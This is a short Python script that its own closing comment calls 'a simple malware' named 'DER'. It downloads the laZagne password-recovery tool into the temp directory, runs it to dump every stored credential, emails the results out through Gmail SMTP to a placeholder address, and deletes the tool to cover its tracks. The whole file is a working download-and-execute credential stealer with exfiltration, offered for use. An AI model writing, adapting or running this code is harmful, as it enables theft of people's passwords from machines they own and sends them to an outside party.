#!/usr/bin/env python

import requests, subprocess, smtplib, re, os, tempfile

def download(url):
    get_request = requests.get(url)
    
    file_name = url.split("/")[-1]  
    with open(file_name,"wb") as out_file:
    	out_file.write(get_request.content)

def send_mail(email,passwd,message):
	server = smtplib.SMTP("smtp.gmail.com",587)
	server.ehlo()
	server.starttls() 
	server.login(email,passwd)  
	server.sendmail(email, email,message)  
	server.quit()

temp_path = tempfile.gettempdir()  # to get the path of temp directory path
os.chdir(temp_path)
download("http://localhost/laZagne.exe")

command = "laZagne.exe all"
recovered_passwords = subprocess.check_output(command,shell=True)
send_mail("YourEmail@address","passwd",recovered_passwords)

os.remove("laZagne.exe")  # to remove the laZagne programm once done recovering passwords

'''
It's a simple malware which basically will
while run with python 
download the laZagne 
execute it 
report us back
that's why the name 'DER'
and the script we've build is
cross platform compatible 
'''
